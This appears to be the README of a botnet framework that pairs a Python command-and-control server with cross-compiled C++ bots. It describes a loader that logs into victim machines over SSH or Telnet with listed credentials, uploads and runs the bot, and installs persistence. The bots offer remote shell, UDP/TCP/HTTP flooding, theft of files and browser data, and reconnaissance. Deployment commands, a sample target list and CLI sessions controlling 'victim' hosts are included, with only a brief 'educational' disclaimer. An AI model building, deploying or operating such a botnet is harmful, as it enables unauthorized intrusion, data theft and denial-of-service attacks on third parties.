# Mirai-Botnet-Termux

A modular C2 (Command & Control) botnet framework written in **Python** (CNC server) + **C++** (bot client). Designed for educational security research on Termux/Android and Linux VPS.

## Architecture

```
[ATTACKER - Termux/VPS]                   [VICTIM MACHINES]
─────────────────────────                  ─────────────────
CNC Server (Python asyncio)               Bot (C++ static binary)
├── server.py    ← TLS/TCP listener       ├── client       ← CNC connection
├── cli.py       ← attacker interface     ├── modules/     ← payload binaries
├── loader.py    ← SSH/Telnet deployer    └── persistence  ← auto-start
├── handler.py   ← per-bot protocol
├── db.py        ← SQLite storage
└── commands.py  ← dispatch queue
```

### Deploy Flow

```
loader.py reads ip:port:user:pass from targets.txt
    │
    ├── SSH (port 22) or Telnet (port 23) into each machine
    ├── Detect arch (uname -m) → select matching binary
    ├── Upload binary via SCP (SSH) or base64 echo (Telnet)
    ├── chmod +x && execute in background
    └── Bot connects back to CNC server via TLS/TCP
```

### Operation Flow

```
cli.py ──(Unix socket)──→ server.py ──(TLS/TCP)──→ Bot on victim
   │                         │
   │  bots list              ├── manage bot pool
   │  bots count             ├── dispatch commands
   │  bot info <id>          ├── collect results
   │  cmd <id> <module> ...  └── track OS/arch/hostname per bot
```

## Project Structure

```
Mirai-Botnet-Termux/
├── server/                    # CNC - Python (attacker machine)
│   ├── server.py              # Main asyncio server with TLS
│   ├── cli.py                 # Interactive attacker CLI
│   ├── loader.py              # SSH/Telnet bulk deployer
│   ├── handler.py             # Per-bot protocol handler
│   ├── db.py                  # SQLite (aiosqlite)
│   └── commands.py            # Command dispatch queue
├── shared/                    # Shared protocol (Python)
│   ├── crypto.py              # AES-256-GCM encrypt/decrypt
│   └── protocol.py            # Message types, framing, factories
├── bot/                       # Bot - C++ (victim machine)
│   ├── Makefile               # Build + cross-compile
│   ├── client.cpp             # Main bot: connect, auth, cmd loop
│   ├── common.h               # Crypto, JSON, system info, framing
│   ├── persistence.cpp        # Auto-start (cron, rc.local, systemd)
│   └── modules/
│       ├── shell.cpp          # Shell command execution
│       ├── flood.cpp          # UDP/TCP/HTTP DDoS
│       ├── steal.cpp          # File/directory/browser data theft
│       └── recon.cpp          # System/network reconnaissance
├── scripts/
│   ├── setup.sh               # Install dependencies
│   ├── build_bot.sh           # Cross-compile all architectures
│   └── generate_certs.sh      # Self-signed TLS certificates
├── tests/
│   ├── test_shared/           # Crypto + protocol tests
│   └── test_server/           # Database + command queue tests
├── config.example.yaml        # Configuration template
├── targets.example.txt        # Deploy target list template
├── requirements.txt           # Python dependencies
└── pytest.ini                 # Test configuration
```

## Technology Stack

| Component | Language | Details |
|-----------|----------|---------|
| CNC Server | Python 3.11+ | asyncio, TLS, SQLite |
| CNC CLI | Python 3.11+ | Unix socket to server |
| Loader | Python 3.11+ | SSH (paramiko), Telnet (telnetlib), SCP |
| Bot Client | C++17 (static) | OpenSSL, no dependencies |
| Bot Modules | C++17 (static) | Independent binaries via popen() |

**Why C++ static binaries for the bot?**
- Victim machines often lack Python or libraries
- Static binaries run on any Linux without dependencies
- Cross-compiled for: arm, aarch64, x86, x86_64, mips, mipsel

## Quick Start

### Prerequisites

```bash
# Termux
pkg install python rust binutils clang make openssl

# Linux VPS
apt install python3 python3-pip clang make libssl-dev
```

### Setup

```bash
# Clone and setup
git clone <repo-url>
cd Mirai-Botnet-Termux
bash scripts/setup.sh

# This installs Python deps, generates TLS certs, creates config.yaml
```

### Start CNC Server

```bash
# Terminal 1: Start the CNC server
python -m server.server --config config.yaml

# Terminal 2: Open attacker CLI
python -m server.cli
```

### Build Bot Binaries

```bash
# Native build (current architecture only)
cd bot && make

# Cross-compile for all architectures
bash scripts/build_bot.sh
```

### Deploy Bots

```bash
# Create targets file (ip:port:user:pass)
cat > targets.txt << 'EOF'
192.168.1.10:22:root:admin123
192.168.1.11:23:admin:password
10.0.0.5:2222:ubuntu:ubuntu
EOF

# Deploy with auto arch detection
python -m server.loader --targets targets.txt --binary-dir dist/ --threads 20
```

## CLI Commands

```
[CNC]> help
Commands:
  bots list              List all bots
  bots count             Show bot statistics
  bot info <id>          Show bot details
  cmd <bot_id> shell <command>       Execute shell command
  cmd <bot_id> flood type=<tcp|udp|http> target=<ip> port=<p> threads=<n> duration=<s>
  cmd <bot_id> steal type=<file|dir|browser> path=<path>
  cmd <bot_id> recon type=<system|network|process|all>
  cmd status <cmd_id>    Check command result
  ping                   Check if CNC server is online
  help                   This help
  exit                   Quit

[CNC]> bots list
  ID    OS                  Arch       Hostname     IP               Status
  1     Ubuntu 22.04        x86_64     victim-pc    10.0.0.5         online
  2     Debian 11           aarch64    raspberry    192.168.1.99     online
  3     CentOS 7            x86_64     web-server   10.0.1.20        offline

[CNC]> bots count
  Total: 3 | Online: 2 | Offline: 1
  Ubuntu 22.04: 1 | Debian 11: 1 | CentOS 7: 1

[CNC]> bot info 1
  ID:         1
  Bot ID:     victim-pc_a1b2c3d4
  OS:         Ubuntu 22.04
  Arch:       x86_64
  Kernel:     5.15.0-91-generic
  Hostname:   victim-pc
  IP:         10.0.0.5
  Status:     online
  First seen: 2026-05-25 12:30:00
  Last seen:  2026-05-25 14:22:00

[CNC]> cmd 1 shell whoami
  Command queued: a1b2c3d4

[CNC]> cmd status a1b2c3d4
  Cmd ID:    a1b2c3d4
  Bot:       victim-pc_a1b2c3d4
  Module:    shell
  Exit code: 0
  Output:
  root
```

## Protocol

### Wire Format

```
[4 bytes: payload length (network byte order)]
[payload: AES-256-GCM encrypted JSON]
```

### Message Types

| Type | Direction | Data |
|------|-----------|------|
| `auth` | Bot → CNC | `bot_id`, `key_hash` |
| `auth_ack` | CNC → Bot | `status`, `session_id` |
| `info` | Bot → CNC | `os`, `os_version`, `arch`, `kernel`, `hostname` |
| `cmd` | CNC → Bot | `cmd_id`, `module`, `params` |
| `result` | Bot → CNC | `cmd_id`, `output`, `exit_code` |
| `heartbeat` | Bot → CNC | `{}` |
| `error` | Both | `code`, `message` |

### Security

- AES-256-GCM authenticated encryption for all traffic
- Per-message random IV (12 bytes)
- Nonce-based replay protection (300s TTL)
- Timestamp drift detection (±60s window)
- Constant-time key hash comparison (timing attack resistant)
- No hardcoded secrets (config file + CLI args only)

## Configuration

Copy `config.example.yaml` to `config.yaml` and customize:

```yaml
server:
  host: "0.0.0.0"
  port: 8443
  tls_cert: "certs/server.crt"
  tls_key: "certs/server.key"

crypto:
  key: "<64-char hex = 32 bytes AES-256 key>"

database:
  path: "cnc.db"

heartbeat:
  interval: 30      # seconds between heartbeats
  timeout: 90       # seconds until bot marked offline
```

## Testing

```bash
# Run all tests (34 tests)
pytest tests/ -v

# Run specific test suites
pytest tests/test_shared/ -v
pytest tests/test_server/ -v
```

## Disclaimer

This project is for **educational and authorized security research purposes only**. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.

## License

MIT
